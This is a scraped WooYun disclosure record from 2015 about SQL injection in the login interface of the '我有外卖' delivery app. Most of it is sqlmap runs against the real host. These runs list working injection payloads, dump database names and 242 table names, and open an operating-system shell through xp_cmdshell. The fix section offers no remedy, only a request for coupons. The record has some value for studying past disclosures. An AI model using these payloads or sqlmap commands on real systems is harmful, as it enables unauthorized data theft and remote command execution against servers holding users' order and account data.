{"id": 41034, "wybug_id": "wooyun-2015-090115", "wybug_title": "我有外卖APP某接口SQL注入", "wybug_corp": "我有外卖", "wybug_author": "路人甲", "wybug_date": "2015-01-06 16:44", "wybug_open_date": "2015-02-20 16:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 我有外卖 app sql注入 详细说明：  apk解包\n\n就拿登陆的的试试？\n\n\nsqlmap.py -u \"http://phone.ideliver1.cn:100/LoggIn.aspx?stMail=1&stPassWord=1 \"'git' 不是内部或外部命令，也不是可运行的程序或批处理文件。         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141213}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:33:30'stty' 不是内部或外部命令，也不是可运行的程序或批处理文件。[17:33:30] [INFO] resuming back-end DBMS 'microsoft sql server' [17:33:30] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: stMail (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stMail=18059104620' AND 1329=1329 AND 'ckIM'='ckIM&stPassWord=qq64wpwp    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: stMail=18059104620'; WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwp    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: stMail=18059104620' WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwpParameter: stPassWord (GET)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: stMail=18059104620&stPassWord=qq64wpwp' UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(84)+CHAR(87)+CHAR(100)+CHAR(88)+CHAR(120)+CHAR(72)+CHAR(74)+CHAR(100)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: stMail=18059104620&stPassWord=-3644' OR 4545=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'WVKM'='WVKM---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: stMail, type: Single quoted string (default)[1] place: GET, parameter: stPassWord, type: Single quoted string[q] Quit> 1[17:33:42] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2008[17:33:42] [INFO] fetched data logged to text files under 'C:\\Users\\apple\\.sqlmap\\output\\phone.ideliver1.cn'[*] shutting down at 17:33:42\n   漏洞证明：  \nC:\\Users\\apple\\Desktop\\sqlmap>sqlmap.py -u \"http://phone.ideliver1.cn:100/LoggIn.aspx?stMail=1&stPassWord=1 \" --dbs'git' 不是内部或外部命令，也不是可运行的程序或批处理文件。         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141213}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:35:30'stty' 不是内部或外部命令，也不是可运行的程序或批处理文件。[17:35:30] [INFO] resuming back-end DBMS 'microsoft sql server' [17:35:30] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: stMail (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stMail=18059104620' AND 1329=1329 AND 'ckIM'='ckIM&stPassWord=qq64wpwp    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: stMail=18059104620'; WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwp    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: stMail=18059104620' WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwpParameter: stPassWord (GET)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: stMail=18059104620&stPassWord=qq64wpwp' UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(84)+CHAR(87)+CHAR(100)+CHAR(88)+CHAR(120)+CHAR(72)+CHAR(74)+CHAR(100)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: stMail=18059104620&stPassWord=-3644' OR 4545=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'WVKM'='WVKM---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: stMail, type: Single quoted string (default)[1] place: GET, parameter: stPassWord, type: Single quoted string[q] Quit> 0[17:35:32] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2008[17:35:32] [INFO] fetching database names[17:35:32] [INFO] fetching number of databases[17:35:32] [INFO] resumed: 7[17:35:32] [INFO] resumed: bak[17:35:32] [INFO] resumed: bdw[17:35:32] [INFO] resumed: db0q4m52ys8214ma[17:35:32] [INFO] resumed: master[17:35:32] [INFO] resumed: model[17:35:32] [INFO] resumed: msdb[17:35:32] [INFO] resumed: tempdbavailable databases [7]:[*] bak[*] bdw[*] db0q4m52ys8214ma[*] master[*] model[*] msdb[*] tempdb[17:35:32] [INFO] fetched data logged to text files under 'C:\\Users\\apple\\.sqlmap\\output\\phone.ideliver1.cn'[*] shutting down at 17:35:32\n库和表\nC:\\Users\\apple\\Desktop\\sqlmap>sqlmap.py -u \"http://phone.ideliver1.cn:100/LoggIn.aspx?stMail=1&stPassWord=1 \" --tables -D \"bdw\"'git' 不是内部或外部命令，也不是可运行的程序或批处理文件。         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141213}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:38:11'stty' 不是内部或外部命令，也不是可运行的程序或批处理文件。[18:38:12] [INFO] resuming back-end DBMS 'microsoft sql server' [18:38:12] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: stMail (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stMail=18059104620' AND 1329=1329 AND 'ckIM'='ckIM&stPassWord=qq64wpwp    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: stMail=18059104620'; WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwp    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: stMail=18059104620' WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwpParameter: stPassWord (GET)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: stMail=18059104620&stPassWord=qq64wpwp' UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(84)+CHAR(87)+CHAR(100)+CHAR(88)+CHAR(120)+CHAR(72)+CHAR(74)+CHAR(100)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: stMail=18059104620&stPassWord=-3644' OR 4545=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'WVKM'='WVKM---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: stMail, type: Single quoted string (default)[1] place: GET, parameter: stPassWord, type: Single quoted string[q] Quit> 1[18:38:13] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2008[18:38:13] [INFO] fetching tables for database: bdw[18:38:13] [INFO] the SQL query used returns 242 entries                                                                               Database: bdw[242 tables]+-------------------------------+| MDB010_bak1009                || MDB010_bak1010                || MDB910_deleted                || MDB910_deleted                || Tempyonghu                    || V_UntreatedOrder              || View_maxpj                    || commentInfo                   || goodffsp                      || mdb000_bak0708                || mdb000_bak0708                || mdb000_bak0708                || mdb001_bak1023_2              || mdb001_bak1023_2              || mdb001_bak1023_2              || mdb001_bak1023_2              || mdb001_bak1027                || mdb002_bak                    || mdb002_bak                    || mdb003_bak0624                || mdb003_bak0624                || mdb003_bak0624                || mdb003_bak1009                || mdb003_bak1010                || mdb003_bak1017_1              || mdb003_bak1017_1              || mdb004_bak                    || mdb004_bak                    || mdb005                        || mdb006                        || mdb007                        || mdb008                        || mdb009                        || mdb010_bak0406                || mdb010_bak0406                || mdb010_bak0406                || mdb010_bak0624                || mdb011                        || mdb012_bak1009                || mdb012_bak1009                || mdb012_bak1010                || mdb013                        || mdb014                        || mdb015                        || mdb016                        || mdb017                        || mdb018                        || mdb019_t                      || mdb019_t                      || mdb020                        || mdb028                        || mdb029                        || mdb031                        || mdb037                        || mdb040_bak                    || mdb040_bak                    || mdb041                        || mdb042                        || mdb050                        || mdb051                        || mdb061                        || mdb081                        || mdb082                        || mdb083                        || mdb084_bak0825                || mdb084_bak0825                || mdb089                        || mdb090                        || mdb091                        || mdb092                        || mdb094                        || mdb095                        || mdb096                        || mdb097                        || mdb098                        || mdb099                        || mdb101                        || mdb102                        || mdb103                        || mdb110                        || mdb120                        || mdb998                        || mtmp007                       || nocoupon                      || pgoods_2                      || pgoods_2                      || pmdb001                       || pmdb002                       || pmdb003_2                     || pmdb003_2                     || pmdb003_n                     || pmdb004                       || pmdb005                       || pmdb006                       || ptdb23                        || ptdb2930                      || ptdbOrderStatus               || rand_data                     || storders                      || tdb001                        || tdb010                        || tdb011                        || tdb012                        || tdb013                        || tdb014                        || tdb015                        || tdb020                        || tdb023                        || tdb026                        || tdb027                        || tdb028                        || tdb029_2013                   || tdb029_2013                   || tdb029_2014                   || tdb030                        || tdb031                        || tdb032                        || tdb033_bak                    || tdb033_bak                    || tdb034                        || tdb040                        || tdb041                        || tdb042                        || tdb043                        || tdb045                        || tdb046                        || tdb047                        || tdb050_bak0325                || tdb050_bak0325                || tdb050_bak0326                || tdb050_bak0702                || tdb050_bak20140829            || tdb051_bak2014                || tdb051_bak2014                || tdb052_2013                   || tdb052_2013                   || tdb052_2014                   || tdb052_bak0812                || tdb053                        || tdb054                        || tdb055                        || tdb056                        || tdb057                        || tdb059                        || tdb060                        || tdb061                        || tdb071                        || tdb072_bak0626                || tdb072_bak0626                || tdb072_bak0626                || tdb073_2014                   || tdb073_2014                   || tdb082                        || tdb083                        || tdb084                        || tdb085_bak140507              || tdb085_bak140507              || tdb085_bak140507              || tdb086                        || tdb090                        || tdb091                        || tdb100                        || tdb110                        || tdb930                        || tdb999                        || tmp010                        || tmp222                        || tmp_inputClass                || tmp_inputGoods                || tmp_shopinput                 || tmpsk007                      || tskgoods                      || v_charge_list                 || v_closeshop                   || v_grade                       || v_new_comment                 || v_ordersPerUser4              || v_ordersPerUser4              || v_search_coupons              || v_search_goodsproperty        || v_search_mycoupons            || v_search_singlecoupons        || v_socket_sendlist             || v_tdb029                      || v_tdb052                      || v_yidie_tokencode             || vie_acthis                    || vie_adver                     || vie_agentshop                 || vie_enteragentallhis          || vie_enteragentalllist         || vie_entergood                 || vie_enterprisefav             || vie_enterpriseorder           || vie_entershopalllist          || vie_entershopalllist          || vie_entershopdoc              || vie_favorateshop              || vie_gooddtlist                || vie_maxlogin                  || vie_mgrecharge                || vie_ordertail                 || vie_paytj                     || vie_pj                        || vie_sawlogin                  || vie_sendphone                 || vie_shopchkmain               || vie_shopchkpic                || vie_shopclasscheck            || vie_shopgoodschecklist        || vie_shopgoodschecklist        || vie_shopmap                   || vie_shopnewcheck              || vie_shopopclose               || vie_shopupclasscheck          || vie_shopzdclasscheck          || view_fans                     || woyou                         || yidie_Buss_Open               || yidie_active_log              || yidie_coupon_phone_3_bak      || yidie_coupon_phone_3_bak      || yidie_sh_users_orders         || yidie_shops_orders_amount_avg || yidie_shops_orders_amount_avg || yidie_st_users_orders         || yidie_userView1               || yidie_userView1               || yidie_userView2               || yidie_users_first_order       || yidie_v_invalid_orders        || yidie_v_mdb001                || yidie_v_mdb015                || yidie_v_shoplogin             || yidie_v_shopstatus            || yidie_v_tdb010                || yidie_v_tdb029                || yidie_v_tdb052                || yidie_v_tdb073                || yidie_v_usercoupon            || yidie_woyouuser               || yidie_wxyx_phone              |+-------------------------------+[18:38:13] [INFO] fetched data logged to text files under 'C:\\Users\\apple\\.sqlmap\\output\\phone.ideliver1.cn'[*] shutting down at 18:38:13\ncmd shell\nC:\\Users\\apple\\Desktop\\sqlmap>sqlmap.py -u \"http://phone.ideliver1.cn:100/LoggIn.aspx?stMail=1&stPassWord=1 \" --os-shell'git' 不是内部或外部命令，也不是可运行的程序或批处理文件。         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141213}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:39:55'stty' 不是内部或外部命令，也不是可运行的程序或批处理文件。[18:39:56] [INFO] resuming back-end DBMS 'microsoft sql server' [18:39:56] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: stMail (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stMail=18059104620' AND 1329=1329 AND 'ckIM'='ckIM&stPassWord=qq64wpwp    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: stMail=18059104620'; WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwp    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: stMail=18059104620' WAITFOR DELAY '0:0:5'--&stPassWord=qq64wpwpParameter: stPassWord (GET)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: stMail=18059104620&stPassWord=qq64wpwp' UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(84)+CHAR(87)+CHAR(100)+CHAR(88)+CHAR(120)+CHAR(72)+CHAR(74)+CHAR(100)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: stMail=18059104620&stPassWord=-3644' OR 4545=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'WVKM'='WVKM---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: stMail, type: Single quoted string (default)[1] place: GET, parameter: stPassWord, type: Single quoted string[q] Quit> 0[18:40:00] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2008[18:40:00] [INFO] testing if current user is DBA                                                                               [18:40:00] [WARNING] time-based comparison requires larger statistical model, please wait..............................[18:40:09] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [18:40:10] [INFO] testing if xp_cmdshell extended procedure is usable[18:40:10] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[18:40:17] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files. do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[18:40:35] [ERROR] unable to retrieve xp_cmdshell output[18:40:35] [INFO] going to use xp_cmdshell extended procedure for operating system command execution[18:40:35] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTERos-shell>\n   修复方案：  给我点优惠卷吧。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}